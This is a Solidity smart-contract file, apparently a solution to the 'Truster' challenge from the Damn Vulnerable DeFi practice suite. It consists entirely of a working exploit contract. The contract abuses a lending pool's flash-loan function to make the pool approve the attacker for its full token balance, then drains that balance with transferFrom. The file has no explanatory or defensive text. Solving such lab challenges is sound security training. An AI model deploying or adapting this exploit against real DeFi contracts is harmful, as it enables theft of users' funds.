// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title Attack for DeFi
 * @author CP3cO / Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract Attack003 {
    using Address for address;

    function attack(
        address contractToAttack,
        uint256 borrowAmount,
        address borrower,
        address targetToken
    ) external {
        ITrusterLenderPool(contractToAttack).flashLoan(
            borrowAmount,
            borrower,
            targetToken,
            abi.encodeWithSelector(
                bytes4(keccak256(bytes("approve(address,uint256)"))),
                address(this),
                IERC20(targetToken).balanceOf(contractToAttack)
            )
        );
        if (borrowAmount > 0)
            IERC20(targetToken).transfer(contractToAttack, borrowAmount);
        IERC20(targetToken).transferFrom(
            contractToAttack,
            msg.sender,
            IERC20(targetToken).balanceOf(contractToAttack)
        );
    }

    function callback(address targetToken) external {
        IERC20(targetToken).approve(
            address(this),
            IERC20(targetToken).balanceOf(msg.sender)
        );
    }
}
